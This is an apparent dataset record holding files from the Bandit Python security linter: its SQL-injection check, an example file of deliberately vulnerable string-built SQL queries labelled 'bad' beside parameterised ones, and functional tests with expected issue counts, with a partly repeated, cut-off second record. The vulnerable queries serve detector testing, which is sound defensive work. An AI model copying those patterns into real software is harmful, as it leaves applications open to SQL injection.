'format'):\n        statement = node.s\n        # Hierarchy for \"\".format() is Wrapper -> Call -> Attribute -> Str\n        wrapper = node.parent.parent.parent\n\n    if isinstance(wrapper, ast.Call):  # wrapped in \"execute\" call?\n        names = ['execute', 'executemany']\n        name = utils.get_called_name(wrapper)\n        return (name in names, statement)\n    else:\n        return (False, statement)\n\n\n@test.checks('Str')\n@test.test_id('B608')\ndef hardcoded_sql_expressions(context):\n    val = _evaluate_ast(context.node)\n    if _check_string(val[1]):\n        return bandit.Issue(\n            severity=bandit.MEDIUM,\n            confidence=bandit.MEDIUM if val[0] else bandit.LOW,\n            text=\"Possible SQL injection vector through string-based \"\n                 \"query construction.\"\n        )\n/n/n/nexamples/sql_statements.py/n/nimport sqlalchemy\n\n# bad\nquery = \"SELECT * FROM foo WHERE id = '%s'\" % identifier\nquery = \"INSERT INTO foo VALUES ('a', 'b', '%s')\" % value\nquery = \"DELETE FROM foo WHERE id = '%s'\" % identifier\nquery = \"UPDATE foo SET value = 'b' WHERE id = '%s'\" % identifier\nquery = \"\"\"WITH cte AS (SELECT x FROM foo)\nSELECT x FROM cte WHERE x = '%s'\"\"\" % identifier\n# bad alternate forms\nquery = \"SELECT * FROM foo WHERE id = '\" + identifier + \"'\"\nquery = \"SELECT * FROM foo WHERE id = '{}'\".format(identifier)\n\n# bad\ncur.execute(\"SELECT * FROM foo WHERE id = '%s'\" % identifier)\ncur.execute(\"INSERT INTO foo VALUES ('a', 'b', '%s')\" % value)\ncur.execute(\"DELETE FROM foo WHERE id = '%s'\" % identifier)\ncur.execute(\"UPDATE foo SET value = 'b' WHERE id = '%s'\" % identifier)\n# bad alternate forms\ncur.execute(\"SELECT * FROM foo WHERE id = '\" + identifier + \"'\")\ncur.execute(\"SELECT * FROM foo WHERE id = '{}'\".format(identifier))\n\n# good\ncur.execute(\"SELECT * FROM foo WHERE id = '%s'\", identifier)\ncur.execute(\"INSERT INTO foo VALUES ('a', 'b', '%s')\", value)\ncur.execute(\"DELETE FROM foo WHERE id = '%s'\", identifier)\ncur.execute(\"UPDATE foo SET value = 'b' WHERE id = '%s'\", identifier)\n\n# bug: https://bugs.launchpad.net/bandit/+bug/1479625\ndef a():\n    def b():\n        pass\n    return b\n\na()(\"SELECT %s FROM foo\" % val)\n\n# real world false positives\nchoices=[('server_list', _(\"Select from active instances\"))]\nprint(\"delete from the cache as the first argument\")\n/n/n/ntests/functional/test_functional.py/n/n# -*- coding:utf-8 -*-\n#\n# Copyright 2014 Hewlett-Packard Development Company, L.P.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n\nimport os\n\nimport six\nimport testtools\n\nfrom bandit.core import config as b_config\nfrom bandit.core import constants as C\nfrom bandit.core import manager as b_manager\nfrom bandit.core import metrics\nfrom bandit.core import test_set as b_test_set\n\n\nclass FunctionalTests(testtools.TestCase):\n\n    '''Functional tests for bandit test plugins.\n\n    This set of tests runs bandit against each example file in turn\n    and records the score returned. This is compared to a known good value.\n    When new tests are added to an example the expected result should be\n    adjusted to match.\n    '''\n\n    def setUp(self):\n        super(FunctionalTests, self).setUp()\n        # NOTE(tkelsey): bandit is very sensitive to paths, so stitch\n        # them up here for the testing environment.\n        #\n        path = os.path.join(os.getcwd(), 'bandit', 'plugins')\n        b_conf = b_config.BanditConfig()\n        self.b_mgr = b_manager.BanditManager(b_conf, 'file')\n        self.b_mgr.b_conf._settings['plugins_dir'] = path\n        self.b_mgr.b_ts = b_test_set.BanditTestSet(config=b_conf)\n\n    def run_example(self, example_script, ignore_nosec=False):\n        '''A helper method to run the specified test\n\n        This method runs the test, which populates the self.b_mgr.scores\n        value. Call this directly if you need to run a test, but do not\n        need to test the resulting scores against specified values.\n        :param example_script: Filename of an example script to test\n        '''\n        path = os.path.join(os.getcwd(), 'examples', example_script)\n        self.b_mgr.ignore_nosec = ignore_nosec\n        self.b_mgr.discover_files([path], True)\n        self.b_mgr.run_tests()\n\n    def check_example(self, example_script, expect, ignore_nosec=False):\n        '''A helper method to test the scores for example scripts.\n\n        :param example_script: Filename of an example script to test\n        :param expect: dict with expected counts of issue types\n        '''\n        # reset scores for subsequent calls to check_example\n        self.b_mgr.scores = []\n        self.run_example(example_script, ignore_nosec=ignore_nosec)\n        expected = 0\n        result = 0\n        for test_scores in self.b_mgr.scores:\n            for score_type in test_scores:\n                self.assertIn(score_type, expect)\n                for rating in expect[score_type]:\n                    expected += (\n                        expect[score_type][rating] * C.RANKING_VALUES[rating]\n                    )\n                result += sum(test_scores[score_type])\n        self.assertEqual(expected, result)\n\n    def check_metrics(self, example_script, expect):\n        '''A helper method to test the metrics being returned.\n\n        :param example_script: Filename of an example script to test\n        :param expect: dict with expected values of metrics\n        '''\n        self.b_mgr.metrics = metrics.Metrics()\n        self.b_mgr.scores = []\n        self.run_example(example_script)\n\n        # test general metrics (excludes issue counts)\n        m = self.b_mgr.metrics.data\n        for k in expect:\n            if k != 'issues':\n                self.assertEqual(expect[k], m['_totals'][k])\n        # test issue counts\n        if 'issues' in expect:\n            for (criteria, default) in C.CRITERIA:\n                for rank in C.RANKING:\n                    label = '{0}.{1}'.format(criteria, rank)\n                    expected = 0\n                    if expect['issues'].get(criteria, None).get(rank, None):\n                        expected = expect['issues'][criteria][rank]\n                    self.assertEqual(expected, m['_totals'][label])\n\n    def test_binding(self):\n        '''Test the bind-to-0.0.0.0 example.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'MEDIUM': 1}}\n        self.check_example('binding.py', expect)\n\n    def test_crypto_md5(self):\n        '''Test the `hashlib.md5` example.'''\n        expect = {'SEVERITY': {'MEDIUM': 11},\n                  'CONFIDENCE': {'HIGH': 11}}\n        self.check_example('crypto-md5.py', expect)\n\n    def test_ciphers(self):\n        '''Test the `Crypto.Cipher` example.'''\n        expect = {'SEVERITY': {'HIGH': 13},\n                  'CONFIDENCE': {'HIGH': 13}}\n        self.check_example('ciphers.py', expect)\n\n    def test_cipher_modes(self):\n        '''Test for insecure cipher modes.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('cipher-modes.py', expect)\n\n    def test_eval(self):\n        '''Test the `eval` example.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('eval.py', expect)\n\n    def test_mark_safe(self):\n        '''Test the `mark_safe` example.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('mark_safe.py', expect)\n\n    def test_exec(self):\n        '''Test the `exec` example.'''\n        filename = 'exec-{}.py'\n        if six.PY2:\n            filename = filename.format('py2')\n            expect = {'SEVERITY': {'MEDIUM': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        else:\n            filename = filename.format('py3')\n            expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example(filename, expect)\n\n    def test_exec_as_root(self):\n        '''Test for the `run_as_root=True` keyword argument.'''\n        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'MEDIUM': 5}}\n        self.check_example('exec-as-root.py', expect)\n\n    def test_hardcoded_passwords(self):\n        '''Test for hard-coded passwords.'''\n        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'MEDIUM': 7}}\n        self.check_example('hardcoded-passwords.py', expect)\n\n    def test_hardcoded_tmp(self):\n        '''Test for hard-coded /tmp, /var/tmp, /dev/shm.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'MEDIUM': 3}}\n        self.check_example('hardcoded-tmp.py', expect)\n\n    def test_httplib_https(self):\n        '''Test for `httplib.HTTPSConnection`.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('httplib_https.py', expect)\n\n    def test_imports_aliases(self):\n        '''Test the `import X as Y` syntax.'''\n        expect = {\n            'SEVERITY': {'LOW': 4, 'MEDIUM': 5, 'HIGH': 0},\n            'CONFIDENCE': {'HIGH': 9}\n        }\n        self.check_example('imports-aliases.py', expect)\n\n    def test_imports_from(self):\n        '''Test the `from X import Y` syntax.'''\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('imports-from.py', expect)\n\n    def test_imports_function(self):\n        '''Test the `__import__` function.'''\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('imports-function.py', expect)\n\n    def test_telnet_usage(self):\n        '''Test for `import telnetlib` and Telnet.* calls.'''\n        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('telnetlib.py', expect)\n\n    def test_ftp_usage(self):\n        '''Test for `import ftplib` and FTP.* calls.'''\n        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('ftplib.py', expect)\n\n    def test_imports(self):\n        '''Test for dangerous imports.'''\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('imports.py', expect)\n\n    def test_mktemp(self):\n        '''Test for `tempfile.mktemp`.'''\n        expect = {'SEVERITY': {'MEDIUM': 4}, 'CONFIDENCE': {'HIGH': 4}}\n        self.check_example('mktemp.py', expect)\n\n    def test_nonsense(self):\n        '''Test that a syntactically invalid module is skipped.'''\n        self.run_example('nonsense.py')\n        self.assertEqual(1, len(self.b_mgr.skipped))\n\n    def test_okay(self):\n        '''Test a vulnerability-free file.'''\n        expect = {'SEVERITY': {}, 'CONFIDENCE': {}}\n        self.check_example('okay.py', expect)\n\n    def test_os_chmod(self):\n        '''Test setting file permissions.'''\n        filename = 'os-chmod-{}.py'\n        if six.PY2:\n            filename = filename.format('py2')\n        else:\n            filename = filename.format('py3')\n        expect = {\n            'SEVERITY': {'MEDIUM': 2, 'HIGH': 8},\n            'CONFIDENCE': {'MEDIUM': 1, 'HIGH': 9}\n        }\n        self.check_example(filename, expect)\n\n    def test_os_exec(self):\n        '''Test for `os.exec*`.'''\n        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}\n        self.check_example('os-exec.py', expect)\n\n    def test_os_popen(self):\n        '''Test for `os.popen`.'''\n        expect = {'SEVERITY': {'LOW': 8, 'MEDIUM': 0, 'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 9}}\n        self.check_example('os-popen.py', expect)\n\n    def test_os_spawn(self):\n        '''Test for `os.spawn*`.'''\n        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}\n        self.check_example('os-spawn.py', expect)\n\n    def test_os_startfile(self):\n        '''Test for `os.startfile`.'''\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'MEDIUM': 3}}\n        self.check_example('os-startfile.py', expect)\n\n    def test_os_system(self):\n        '''Test for `os.system`.'''\n        expect = {'SEVERITY': {'LOW': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('os_system.py', expect)\n\n    def test_pickle(self):\n        '''Test for the `pickle` module.'''\n        expect = {\n            'SEVERITY': {'LOW': 2, 'MEDIUM': 6},\n            'CONFIDENCE': {'HIGH': 8}\n        }\n        self.check_example('pickle_deserialize.py', expect)\n\n    def test_popen_wrappers(self):\n        '''Test the `popen2` and `commands` modules.'''\n        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}\n        self.check_example('popen_wrappers.py', expect)\n\n    def test_random_module(self):\n        '''Test for the `random` module.'''\n        expect = {'SEVERITY': {'LOW': 6}, 'CONFIDENCE': {'HIGH': 6}}\n        self.check_example('random_module.py', expect)\n\n    def test_requests_ssl_verify_disabled(self):\n        '''Test for the `requests` library skipping verification.'''\n        expect = {'SEVERITY': {'HIGH': 7}, 'CONFIDENCE': {'HIGH': 7}}\n        self.check_example('requests-ssl-verify-disabled.py', expect)\n\n    def test_skip(self):\n        '''Test `#nosec` and `#noqa` comments.'''\n        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'HIGH': 5}}\n        self.check_example('skip.py', expect)\n\n    def test_ignore_skip(self):\n        '''Test --ignore-nosec flag.'''\n        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}\n        self.check_example('skip.py', expect, ignore_nosec=True)\n\n    def test_sql_statements(self):\n        '''Test for SQL injection through string building.'''\n        expect = {\n            'SEVERITY': {'MEDIUM': 14},\n            'CONFIDENCE': {'LOW': 8, 'MEDIUM': 6}}\n        self.check_example('sql_statements.py', expect)\n\n    def test_ssl_insecure_version(self):\n        '''Test for insecure SSL protocol versions.'''\n        expect = {\n            'SEVERITY': {'LOW': 1, 'MEDIUM': 10, 'HIGH': 7},\n            'CONFIDENCE': {'LOW': 0, 'MEDIUM': 11, 'HIGH': 7}\n        }\n        self.check_example('ssl-insecure-version.py', expect)\n\n    def test_subprocess_shell(self):\n        '''Test for `subprocess.Popen` with `shell=True`.'''\n        expect = {\n            'SEVERITY': {'HIGH': 3, 'MEDIUM': 1, 'LOW': 14},\n            'CONFIDENCE': {'HIGH': 17, 'LOW': 1}\n        }\n        self.check_example('subprocess_shell.py', expect)\n\n    def test_urlopen(self):\n        '''Test for dangerous URL opening.'''\n        expect = {'SEVERITY': {'MEDIUM': 14}, 'CONFIDENCE': {'HIGH': 14}}\n        self.check_example('urlopen.py', expect)\n\n    def test_utils_shell(self):\n        '''Test for `utils.execute*` with `shell=True`.'''\n        expect = {\n            'SEVERITY': {'LOW': 5},\n            'CONFIDENCE': {'HIGH': 5}\n        }\n        self.check_example('utils-shell.py', expect)\n\n    def test_wildcard_injection(self):\n        '''Test for wildcard injection in shell commands.'''\n        expect = {\n            'SEVERITY': {'HIGH': 4, 'MEDIUM': 0, 'LOW': 10},\n            'CONFIDENCE': {'MEDIUM': 5, 'HIGH': 9}\n        }\n        self.check_example('wildcard-injection.py', expect)\n\n    def test_yaml(self):\n        '''Test for `yaml.load`.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('yaml_load.py', expect)\n\n    def test_jinja2_templating(self):\n        '''Test jinja templating for potential XSS bugs.'''\n        expect = {\n            'SEVERITY': {'HIGH': 4},\n            'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}\n        }\n        self.check_example('jinja2_templating.py', expect)\n\n    def test_secret_config_option(self):\n        '''Test for `secret=True` in Oslo's config.'''\n        expect = {\n            'SEVERITY': {'LOW': 1, 'MEDIUM': 2},\n            'CONFIDENCE': {'MEDIUM': 3}\n        }\n        self.check_example('secret-config-option.py', expect)\n\n    def test_mako_templating(self):\n        '''Test Mako templates for XSS.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('mako_templating.py', expect)\n\n    def test_xml(self):\n        '''Test xml vulnerabilities.'''\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}\n        self.check_example('xml_etree_celementtree.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 2},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 2}}\n        self.check_example('xml_expatbuilder.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 3, 'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}}\n        self.check_example('xml_lxml.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},\n                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}\n        self.check_example('xml_pulldom.py', expect)\n\n        expect = {'SEVERITY': {'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('xml_xmlrpc.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}\n        self.check_example('xml_etree_elementtree.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 1}}\n        self.check_example('xml_expatreader.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},\n                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}\n        self.check_example('xml_minidom.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 6},\n                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 6}}\n        self.check_example('xml_sax.py', expect)\n\n    def test_httpoxy(self):\n        '''Test httpoxy vulnerability.'''\n        expect = {'SEVERITY': {'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('httpoxy_cgihandler.py', expect)\n        self.check_example('httpoxy_twisted_script.py', expect)\n        self.check_example('httpoxy_twisted_directory.py', expect)\n\n    def test_asserts(self):\n        '''Test catching the use of assert.'''\n        expect = {'SEVERITY': {'LOW': 1},\n                  'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('assert.py', expect)\n\n    def test_paramiko_injection(self):\n        '''Test paramiko command execution.'''\n        expect = {'SEVERITY': {'MEDIUM': 2},\n                  'CONFIDENCE': {'MEDIUM': 2}}\n        self.check_example('paramiko_injection.py', expect)\n\n    def test_partial_path(self):\n        '''Test process spawning with partial file paths.'''\n        expect = {'SEVERITY': {'LOW': 11},\n                  'CONFIDENCE': {'HIGH': 11}}\n\n        self.check_example('partial_path_process.py', expect)\n\n    def test_try_except_continue(self):\n        '''Test try, except, continue detection.'''\n        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']\n                    if x.__name__ == 'try_except_continue'))\n\n        test._config = {'check_typed_exception': True}\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('try_except_continue.py', expect)\n\n        test._config = {'check_typed_exception': False}\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('try_except_continue.py', expect)\n\n    def test_try_except_pass(self):\n        '''Test try, except pass detection.'''\n        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']\n                     if x.__name__ == 'try_except_pass'))\n\n        test._config = {'check_typed_exception': True}\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('try_except_pass.py', expect)\n\n        test._config = {'check_typed_exception': False}\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('try_except_pass.py', expect)\n\n    def test_metric_gathering(self):\n        expect = {\n            'nosec': 2, 'loc': 7,\n            'issues': {'CONFIDENCE': {'HIGH': 5}, 'SEVERITY': {'LOW': 5}}\n        }\n        self.check_metrics('skip.py', expect)\n        expect = {\n            'nosec': 0, 'loc': 4,\n            'issues': {'CONFIDENCE': {'HIGH': 2}, 'SEVERITY': {'LOW': 2}}\n        }\n        self.check_metrics('imports.py', expect)\n\n    def test_weak_cryptographic_key(self):\n        '''Test for weak key sizes.'''\n        expect = {\n            'SEVERITY': {'MEDIUM': 8, 'HIGH': 6},\n            'CONFIDENCE': {'HIGH': 14}\n        }\n        self.check_example('weak_cryptographic_key_sizes.py', expect)\n\n    def test_multiline_code(self):\n        '''Test issues in multiline statements return code as expected.'''\n        self.run_example('multiline_statement.py')\n        self.assertEqual(0, len(self.b_mgr.skipped))\n        self.assertEqual(1, len(self.b_mgr.files_list))\n        self.assertTrue(self.b_mgr.files_list[0].endswith(\n                        'multiline_statement.py'))\n\n        issues = self.b_mgr.get_issue_list()\n        self.assertEqual(2, len(issues))\n        self.assertTrue(\n            issues[0].fname.endswith('examples/multiline_statement.py')\n        )\n\n        self.assertEqual(1, issues[0].lineno)\n        self.assertEqual(list(range(1, 3)), issues[0].linerange)\n        self.assertIn('subprocess', issues[0].get_code())\n        self.assertEqual(5, issues[1].lineno)\n        self.assertEqual(list(range(3, 6 + 1)), issues[1].linerange)\n        self.assertIn('shell=True', issues[1].get_code())\n\n    def test_code_line_numbers(self):\n        self.run_example('binding.py')\n        issues = self.b_mgr.get_issue_list()\n\n        code_lines = issues[0].get_code().splitlines()\n        lineno = issues[0].lineno\n        self.assertEqual(\"%i \" % (lineno - 1), code_lines[0][:2])\n        self.assertEqual(\"%i \" % (lineno), code_lines[1][:2])\n        self.assertEqual(\"%i \" % (lineno + 1), code_lines[2][:2])\n\n    def test_flask_debug_true(self):\n        expect = {\n            'SEVERITY': {'HIGH': 1},\n            'CONFIDENCE': {'MEDIUM': 1}\n        }\n        self.check_example('flask_debug.py', expect)\n\n    def test_nosec(self):\n        expect = {\n            'SEVERITY': {},\n            'CONFIDENCE': {}\n        }\n        self.check_example('nosec.py', expect)\n\n    def test_baseline_filter(self):\n        issue_text = ('A Flask app appears to be run with debug=True, which '\n                      'exposes the Werkzeug debugger and allows the execution '\n                      'of arbitrary code.')\n        json = \"\"\"{\n          \"results\": [\n            {\n              \"code\": \"...\",\n              \"filename\": \"%s/examples/flask_debug.py\",\n              \"issue_confidence\": \"MEDIUM\",\n              \"issue_severity\": \"HIGH\",\n              \"issue_text\": \"%s\",\n              \"line_number\": 10,\n              \"line_range\": [\n                10\n              ],\n              \"test_name\": \"flask_debug_true\",\n              \"test_id\": \"B201\"\n            }\n          ]\n        }\n        \"\"\" % (os.getcwd(), issue_text)\n\n        self.b_mgr.populate_baseline(json)\n        self.run_example('flask_debug.py')\n        self.assertEqual(1, len(self.b_mgr.baseline))\n        self.assertEqual({}, self.b_mgr.get_issue_list())\n\n    def test_blacklist_input(self):\n        expect = {\n            'SEVERITY': {'HIGH': 1},\n            'CONFIDENCE': {'HIGH': 1}\n        }\n        self.check_example('input.py', expect)\n/n/n/n", "label": 0}, {"id": "6ce60806ca8a44d8a8b37050539e2b2f9a54b847", "code": "/examples/sql_statements.py/n/nimport sqlalchemy\n\n# bad\nquery = \"SELECT * FROM foo WHERE id = '%s'\" % identifier\nquery = \"INSERT INTO foo VALUES ('a', 'b', '%s')\" % value\nquery = \"DELETE FROM foo WHERE id = '%s'\" % identifier\nquery = \"UPDATE foo SET value = 'b' WHERE id = '%s'\" % identifier\nquery = \"\"\"WITH cte AS (SELECT x FROM foo)\nSELECT x FROM cte WHERE x = '%s'\"\"\" % identifier\n\n# bad\ncur.execute(\"SELECT * FROM foo WHERE id = '%s'\" % identifier)\ncur.execute(\"INSERT INTO foo VALUES ('a', 'b', '%s')\" % value)\ncur.execute(\"DELETE FROM foo WHERE id = '%s'\" % identifier)\ncur.execute(\"UPDATE foo SET value = 'b' WHERE id = '%s'\" % identifier)\n\n# good\ncur.execute(\"SELECT * FROM foo WHERE id = '%s'\", identifier)\ncur.execute(\"INSERT INTO foo VALUES ('a', 'b', '%s')\", value)\ncur.execute(\"DELETE FROM foo WHERE id = '%s'\", identifier)\ncur.execute(\"UPDATE foo SET value = 'b' WHERE id = '%s'\", identifier)\n\n# bad\nquery = \"SELECT \" + val + \" FROM \" + val +\" WHERE id = \" + val\n\n# bad\ncur.execute(\"SELECT \" + val + \" FROM \" + val +\" WHERE id = \" + val)\n\n\n# bug: https://bugs.launchpad.net/bandit/+bug/1479625\ndef a():\n    def b():\n        pass\n    return b\n\na()(\"SELECT %s FROM foo\" % val)\n\n# real world false positives\nchoices=[('server_list', _(\"Select from active instances\"))]\nprint(\"delete from the cache as the first argument\")\n/n/n/n/tests/functional/test_functional.py/n/n# -*- coding:utf-8 -*-\n#\n# Copyright 2014 Hewlett-Packard Development Company, L.P.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n\nimport os\n\nimport six\nimport testtools\n\nfrom bandit.core import config as b_config\nfrom bandit.core import constants as C\nfrom bandit.core import manager as b_manager\nfrom bandit.core import metrics\nfrom bandit.core import test_set as b_test_set\n\n\nclass FunctionalTests(testtools.TestCase):\n\n    '''Functional tests for bandit test plugins.\n\n    This set of tests runs bandit against each example file in turn\n    and records the score returned. This is compared to a known good value.\n    When new tests are added to an example the expected result should be\n    adjusted to match.\n    '''\n\n    def setUp(self):\n        super(FunctionalTests, self).setUp()\n        # NOTE(tkelsey): bandit is very sensitive to paths, so stitch\n        # them up here for the testing environment.\n        #\n        path = os.path.join(os.getcwd(), 'bandit', 'plugins')\n        b_conf = b_config.BanditConfig()\n        self.b_mgr = b_manager.BanditManager(b_conf, 'file')\n        self.b_mgr.b_conf._settings['plugins_dir'] = path\n        self.b_mgr.b_ts = b_test_set.BanditTestSet(config=b_conf)\n\n    def run_example(self, example_script, ignore_nosec=False):\n        '''A helper method to run the specified test\n\n        This method runs the test, which populates the self.b_mgr.scores\n        value. Call this directly if you need to run a test, but do not\n        need to test the resulting scores against specified values.\n        :param example_script: Filename of an example script to test\n        '''\n        path = os.path.join(os.getcwd(), 'examples', example_script)\n        self.b_mgr.ignore_nosec = ignore_nosec\n        self.b_mgr.discover_files([path], True)\n        self.b_mgr.run_tests()\n\n    def check_example(self, example_script, expect, ignore_nosec=False):\n        '''A helper method to test the scores for example scripts.\n\n        :param example_script: Filename of an example script to test\n        :param expect: dict with expected counts of issue types\n        '''\n        # reset scores for subsequent calls to check_example\n        self.b_mgr.scores = []\n        self.run_example(example_script, ignore_nosec=ignore_nosec)\n        expected = 0\n        result = 0\n        for test_scores in self.b_mgr.scores:\n            for score_type in test_scores:\n                self.assertIn(score_type, expect)\n                for rating in expect[score_type]:\n                    expected += (\n                        expect[score_type][rating] * C.RANKING_VALUES[rating]\n                    )\n                result += sum(test_scores[score_type])\n        self.assertEqual(expected, result)\n\n    def check_metrics(self, example_script, expect):\n        '''A helper method to test the metrics being returned.\n\n        :param example_script: Filename of an example script to test\n        :param expect: dict with expected values of metrics\n        '''\n        self.b_mgr.metrics = metrics.Metrics()\n        self.b_mgr.scores = []\n        self.run_example(example_script)\n\n        # test general metrics (excludes issue counts)\n        m = self.b_mgr.metrics.data\n        for k in expect:\n            if k != 'issues':\n                self.assertEqual(expect[k], m['_totals'][k])\n        # test issue counts\n        if 'issues' in expect:\n            for (criteria, default) in C.CRITERIA:\n                for rank in C.RANKING:\n                    label = '{0}.{1}'.format(criteria, rank)\n                    expected = 0\n                    if expect['issues'].get(criteria, None).get(rank, None):\n                        expected = expect['issues'][criteria][rank]\n                    self.assertEqual(expected, m['_totals'][label])\n\n    def test_binding(self):\n        '''Test the bind-to-0.0.0.0 example.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'MEDIUM': 1}}\n        self.check_example('binding.py', expect)\n\n    def test_crypto_md5(self):\n        '''Test the `hashlib.md5` example.'''\n        expect = {'SEVERITY': {'MEDIUM': 11},\n                  'CONFIDENCE': {'HIGH': 11}}\n        self.check_example('crypto-md5.py', expect)\n\n    def test_ciphers(self):\n        '''Test the `Crypto.Cipher` example.'''\n        expect = {'SEVERITY': {'HIGH': 13},\n                  'CONFIDENCE': {'HIGH': 13}}\n        self.check_example('ciphers.py', expect)\n\n    def test_cipher_modes(self):\n        '''Test for insecure cipher modes.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('cipher-modes.py', expect)\n\n    def test_eval(self):\n        '''Test the `eval` example.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('eval.py', expect)\n\n    def test_mark_safe(self):\n        '''Test the `mark_safe` example.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('mark_safe.py', expect)\n\n    def test_exec(self):\n        '''Test the `exec` example.'''\n        filename = 'exec-{}.py'\n        if six.PY2:\n            filename = filename.format('py2')\n            expect = {'SEVERITY': {'MEDIUM': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        else:\n            filename = filename.format('py3')\n            expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example(filename, expect)\n\n    def test_exec_as_root(self):\n        '''Test for the `run_as_root=True` keyword argument.'''\n        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'MEDIUM': 5}}\n        self.check_example('exec-as-root.py', expect)\n\n    def test_hardcoded_passwords(self):\n        '''Test for hard-coded passwords.'''\n        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'MEDIUM': 7}}\n        self.check_example('hardcoded-passwords.py', expect)\n\n    def test_hardcoded_tmp(self):\n        '''Test for hard-coded /tmp, /var/tmp, /dev/shm.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'MEDIUM': 3}}\n        self.check_example('hardcoded-tmp.py', expect)\n\n    def test_httplib_https(self):\n        '''Test for `httplib.HTTPSConnection`.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        